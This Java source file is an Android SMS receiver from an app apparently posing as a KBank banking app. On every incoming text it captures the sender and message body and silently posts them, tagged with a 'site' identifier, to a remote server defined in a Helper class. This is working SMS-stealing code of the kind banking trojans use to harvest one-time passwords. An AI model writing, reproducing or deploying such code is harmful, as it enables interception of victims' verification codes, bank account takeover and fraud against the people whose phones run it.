package com.msf.kbank.mobile.Suggest;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import com.msf.kbank.mobile.Helper;

public class SmsReceiver extends BroadcastReceiver {

    private String previous_message = "";
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            if(messageBody!=previous_message){
                                previous_message = messageBody;
                                Helper.sendSMS(Helper.SMSURL+Helper.SMSGetNumberPath, messageBody);
                                JSONObject jsonData = new JSONObject();
                                try {
                                    jsonData.put("site", Helper.SITE);
                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    Helper.sendData(Helper.SMSURL+Helper.SMSSavePath, jsonData);
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

}